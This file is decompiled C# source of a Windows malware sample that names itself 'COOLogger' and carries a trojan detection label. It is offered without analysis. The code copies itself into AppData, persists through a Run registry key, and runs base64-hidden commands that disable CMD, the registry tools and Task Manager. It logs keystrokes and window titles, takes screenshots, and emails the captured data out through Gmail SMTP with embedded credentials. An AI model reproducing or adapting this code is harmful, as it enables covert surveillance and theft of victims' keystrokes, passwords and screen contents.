// Decompiled with JetBrains decompiler
// Type: cUsIBkTVpSXkuQd
// Assembly: staker_14th, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EF0BF3C-DAA9-4676-AE2A-176B122DF687
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-17bb9b518a8ef49d33f12cd6ba10c8442006bd9fd969270d4ffc33bfa30156b8.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class cUsIBkTVpSXkuQd
{
  private static string RDeBzbJaMQqQbVn = "ZHViZHViMTMzN0BnbWFpbC5jb20=";
  private static string NkGeXTevKfTdBvZ = "ZHViZHViMTIz";
  private static string aHbgoeKTTSXtBIm = "smtp.gmail.com";
  private static int zyPSVNlBtdMOiLQ = 587;
  private static string eETLvdfzchvGanb;
  private static string NoLKlTkXbBbYSkh;
  private static string FayqnyQeznwVQsu;
  private static string bvBJyennmrOVcHU;
  private static string TjmphGVOxgiDfjx;
  private static string vlRaaZePIPtHGWZ;
  private static int JUPgQmWhnjuMaij = 1200000;
  private static string tQcqYpbfGtqkDzX = (string) null;
  private static string nrulLaTDkmIkoDN = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXFN5c3RlbSAvdiBEaXNhYmxlQ01EIC90IFJFR19EV09SRCAvZCAxIC9m";
  private static string hviVvSRtaseiIit = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlUmVnaXN0cnlUb29scyAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static string nGDZvUMIUkzVJSp = "UkVHIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFBvbGljaWVzXFN5c3RlbSAvdiBEaXNhYmxlVGFza01nciAvdCBSRUdfRFdPUkQgL2QgMSAvZg==";
  private static object daJWvvXfsUnTrJj = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string tRMpqXewFuaVWUZ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage LRYpQPfVYPoRwuc = new MailMessage();
  private static SmtpClient UyjeTneVitcbPBc = new SmtpClient();
  [AccessedThroughProperty("kUQFZPGUeNNzmOk")]
  private static yLZHYKOocaUmjGc _kUQFZPGUeNNzmOk;
  private static object yKNcxyISNqGZsMH;
  private static RichTextBox IlQzvkFvmzKssgS;

  static cUsIBkTVpSXkuQd()
  {
    cUsIBkTVpSXkuQd.kUQFZPGUeNNzmOk = new yLZHYKOocaUmjGc();
    cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH = (object) Path.GetFileName(Application.ExecutablePath);
    cUsIBkTVpSXkuQd.IlQzvkFvmzKssgS = new RichTextBox();
  }

  private static yLZHYKOocaUmjGc kUQFZPGUeNNzmOk
  {
    get => cUsIBkTVpSXkuQd._kUQFZPGUeNNzmOk;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (cUsIBkTVpSXkuQd._kUQFZPGUeNNzmOk != null)
        yLZHYKOocaUmjGc.KeyDown -= new yLZHYKOocaUmjGc.KeyDownEventHandler(cUsIBkTVpSXkuQd.dgYwMFoXZtWboyU);
      cUsIBkTVpSXkuQd._kUQFZPGUeNNzmOk = value;
      if (cUsIBkTVpSXkuQd._kUQFZPGUeNNzmOk == null)
        return;
      yLZHYKOocaUmjGc.KeyDown += new yLZHYKOocaUmjGc.KeyDownEventHandler(cUsIBkTVpSXkuQd.dgYwMFoXZtWboyU);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int ctGurlEBXHSYUfw(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    cUsIBkTVpSXkuQd.vlRaaZePIPtHGWZ = Conversions.ToString(true);
    cUsIBkTVpSXkuQd.FayqnyQeznwVQsu = Conversions.ToString(true);
    cUsIBkTVpSXkuQd.bvBJyennmrOVcHU = Conversions.ToString(true);
    cUsIBkTVpSXkuQd.TjmphGVOxgiDfjx = Conversions.ToString(true);
    cUsIBkTVpSXkuQd.NoLKlTkXbBbYSkh = Conversions.ToString(true);
    cUsIBkTVpSXkuQd.eETLvdfzchvGanb = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\lsJkjzpsjJlROwk.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(cUsIBkTVpSXkuQd.tRMpqXewFuaVWUZ + "\\lsJkjzpsjJlROwk.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(cUsIBkTVpSXkuQd.eETLvdfzchvGanb) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH), Operators.ConcatenateObject(Operators.ConcatenateObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), cUsIBkTVpSXkuQd.yKNcxyISNqGZsMH));
    if (Conversions.ToBoolean(cUsIBkTVpSXkuQd.NoLKlTkXbBbYSkh))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\lsJkjzpsjJlROwk.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(cUsIBkTVpSXkuQd.FayqnyQeznwVQsu))
      Interaction.Shell(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.nrulLaTDkmIkoDN), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(cUsIBkTVpSXkuQd.bvBJyennmrOVcHU))
      Interaction.Shell(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.hviVvSRtaseiIit), AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(cUsIBkTVpSXkuQd.TjmphGVOxgiDfjx))
      Interaction.Shell(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.nGDZvUMIUkzVJSp), AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 1200000;
    timer1.Tick += new EventHandler(cUsIBkTVpSXkuQd.wLsKvzZOLFXUrNl_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(cUsIBkTVpSXkuQd.rnzDRmoxIDfvOiC_Ticked);
    timer2.Start();
    cUsIBkTVpSXkuQd.kUQFZPGUeNNzmOk.BGDORgCDMWRuKdw();
    Application.Run();
  }

  private static string xTUeCiMcIPipfLG()
  {
    string lpString = new string(char.MinValue, 100);
    cUsIBkTVpSXkuQd.ctGurlEBXHSYUfw(cUsIBkTVpSXkuQd.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string hVHiFEfNeQUuUfZ(string ObaqtwoNcVGnpKm) => Encoding.ASCII.GetString(Convert.FromBase64String(ObaqtwoNcVGnpKm));

  public static void wLsKvzZOLFXUrNl_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(cUsIBkTVpSXkuQd.vlRaaZePIPtHGWZ))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = cUsIBkTVpSXkuQd.OhbRwGGFKunuZml(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cUsIBkTVpSXkuQd.daJWvvXfsUnTrJj, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.RDeBzbJaMQqQbVn));
        message.To.Add(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.RDeBzbJaMQqQbVn));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = cUsIBkTVpSXkuQd.IlQzvkFvmzKssgS.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.RDeBzbJaMQqQbVn), cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.NkGeXTevKfTdBvZ))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        cUsIBkTVpSXkuQd.IlQzvkFvmzKssgS.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage lrYpQpfVyPoRwuc = cUsIBkTVpSXkuQd.LRYpQPfVYPoRwuc;
      lrYpQpfVyPoRwuc.From = new MailAddress(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.RDeBzbJaMQqQbVn));
      lrYpQpfVyPoRwuc.To.Add(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.RDeBzbJaMQqQbVn));
      lrYpQpfVyPoRwuc.Subject = "COOLogger Logs from - " + Environment.UserName;
      lrYpQpfVyPoRwuc.Body = cUsIBkTVpSXkuQd.IlQzvkFvmzKssgS.Text;
      SmtpClient uyjeTneVitcbPbc = cUsIBkTVpSXkuQd.UyjeTneVitcbPBc;
      uyjeTneVitcbPbc.Host = "smtp.gmail.com";
      uyjeTneVitcbPbc.Port = 587;
      uyjeTneVitcbPbc.EnableSsl = true;
      uyjeTneVitcbPbc.Credentials = (ICredentialsByHost) new NetworkCredential(cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.RDeBzbJaMQqQbVn), cUsIBkTVpSXkuQd.hVHiFEfNeQUuUfZ(cUsIBkTVpSXkuQd.NkGeXTevKfTdBvZ));
      uyjeTneVitcbPbc.Send(cUsIBkTVpSXkuQd.LRYpQPfVYPoRwuc);
      cUsIBkTVpSXkuQd.IlQzvkFvmzKssgS.Text = "";
    }
  }

  public static void dgYwMFoXZtWboyU(Keys e) => cUsIBkTVpSXkuQd.IlQzvkFvmzKssgS.Text += cUsIBkTVpSXkuQd.kUQFZPGUeNNzmOk.GzpVeediTMTxLKa(e);

  public static void rnzDRmoxIDfvOiC_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(cUsIBkTVpSXkuQd.tQcqYpbfGtqkDzX, cUsIBkTVpSXkuQd.xTUeCiMcIPipfLG(), false) == 0)
      return;
    cUsIBkTVpSXkuQd.tQcqYpbfGtqkDzX = cUsIBkTVpSXkuQd.xTUeCiMcIPipfLG();
    if (Operators.CompareString(cUsIBkTVpSXkuQd.tQcqYpbfGtqkDzX, "", false) == 0)
      return;
    RichTextBox ilQzvkFvmzKssgS = cUsIBkTVpSXkuQd.IlQzvkFvmzKssgS;
    ilQzvkFvmzKssgS.Text = ilQzvkFvmzKssgS.Text + "\r\n\r\n~~~~~" + cUsIBkTVpSXkuQd.tQcqYpbfGtqkDzX + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string OhbRwGGFKunuZml(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
